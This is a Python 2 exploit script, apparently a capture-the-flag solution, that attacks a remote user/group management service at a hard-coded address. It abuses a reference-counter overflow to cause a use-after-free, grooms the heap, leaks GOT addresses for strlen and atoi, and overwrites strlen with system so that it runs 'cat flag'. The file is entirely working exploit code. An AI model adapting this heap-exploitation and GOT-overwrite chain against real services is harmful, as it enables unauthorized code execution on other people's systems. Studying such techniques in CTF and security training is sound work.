import socket
import struct
import time

def recvuntil(s, stop):
    data = ''
    while stop not in data:
        data += s.recv(1024)
    print repr('[RECEIVED]: ' + data)
    return data

def add_user(s, user_name, group_name, age, is_recv_until=True):
    # [ALLOC(GROUP_NAME - 0x18)]
    # [ALLOC(GROUP_STRUCT - 0x10)]
    # ALLOC(USER_STRUCT - 0x18)
    # ALLOC(USER_NAME)
    s.sendall('0\n')
    s.sendall(user_name + '\n')
    s.sendall(group_name + '\n')
    s.sendall(str(age) + '\n')
    if is_recv_until:
        recvuntil(s, 'created')

def display_group(s, group_name, is_recv_until=True):
    # Prints all users pointing to group 
    s.sendall('1\n')
    s.sendall(group_name + '\n')
    if is_recv_until:
        return recvuntil(s, 'Age: ')

def display_user(s, user_index):
    # Prints just the user in index
    s.sendall('2\n')
    s.sendall(str(user_index) + '\n')
    return recvuntil(s, 'Age: ')

def edit_group(s, user_index, is_propagating, group_name, is_recv_until=False):
    s.sendall('3\n')
    s.sendall(str(user_index) + '\n')
    if is_propagating:
        s.sendall('y\n')
    else:
        s.sendall('n\n')
    s.sendall(group_name + '\n')
    if is_recv_until:
        recvuntil(s, 'group name:')

def delete_user(s, user_index):
    # DELETE(USER_STRUCT)
    s.sendall('4\n')
    s.sendall(str(user_index) + '\n')
    recvuntil(s, 'index:')

# DELETER: FREE(group_name), FREE(group_struct)

def main():
    ADDR = ('35.198.176.224', 1337)
    s = socket.socket()
    s.connect(ADDR)
    
    # first user for no-allocation-afterwards group
    add_user(s, '0' * 0x1f, 'g0', 21)
    
    # being playfull with the heap (probably useless, but I like it)
    for i in range(10):
        add_user(s, '1' * 0x1f, 'g0', 21)
        delete_user(s, 1)
        
    # shaping, again just for fun
    add_user(s, '1' * 0x1f, 'g0', 21)
    add_user(s, '2' * 0x1f, 'g0', 21)
    delete_user(s, 1)
    
    # g1 will get UAFd
    add_user(s, '1' * 0x1f, 'g1', 21) # GN(0x18), GS(0x10), US(0x18), UN(random) 
    add_user(s, '3' * 0x1f, 'g1', 23)
    
    # And also g4,g6..g18 (couldn't allocate when it was just g1)
    for i in range(4, 20, 2):
        add_user(s, '4' * 0x1f, 'g' + str(i), 1)
        add_user(s, '5' * 0x1f, 'g' + str(i), 1)
    
    # free them via counter overflow! (vuln)
    # (non receiving for fast work)
    for i in range(254):
        print i
        edit_group(s, 1, False, 'g2')
        for j in range(4, 20, 2):
            edit_group(s, j, False, 'g' + str(j))
        
    # let the deleter do it's job...
    time.sleep(3) # GN FREE, GS FREE

    # just to be certain they are indeed freed
    for j in range(4, 20, 2):
        display_user(s, j + 1)
        
    # now allocate some on them
    for i in range(20, 25):
        add_user(s, str(i) * 0xf, 'g0', 22) # US = GN TAKEN 
    
    # the wanted read offset
    strlen_got_offset = struct.pack('<Q', 0x602068)
    atoi_got_offset = struct.pack('<Q', 0x602088)
    
    # now use them! write offsets in got on user structs
    for j in range(4, 20, 2):
        display_user(s, j + 1)
        edit_group(s, j + 1, True, 'a' * 8 + atoi_got_offset + strlen_got_offset)
        
    # read! (23 was an arbitrary choice)
    read_data = display_user(s, 23)
    strlen_addr = struct.unpack('<Q', read_data.split('Group: ')[1].split('\n')[0] + '\x00' * 2)[0]
    atoi_addr = struct.unpack('<Q', read_data.split('Name: ')[1].split('\n')[0] + '\x00' * 2)[0]

    print hex(strlen_addr)
    print hex(atoi_addr)
    
    # calculate offset to system from strlen 
    # (via static offset system->atoi and then dynamic [second_addr] offset atoi->strlen)  
    system_addr = strlen_addr + 0xf010 - 0x67e90
    system_addr_write = struct.pack('<Q', system_addr)

    # write the system addr on got.plt over strlen
    edit_group(s, 23, True, system_addr_write, is_recv_until = True)
    
    # trigger jump
    add_user(s, 'cat flag\x00', 'cat flag\x00', 'cat flag\x00', is_recv_until=False)
    
    # get flag
    print '--------------------------------'
    for i in range(5):
        print s.recv(2048)
    s.close()

main() 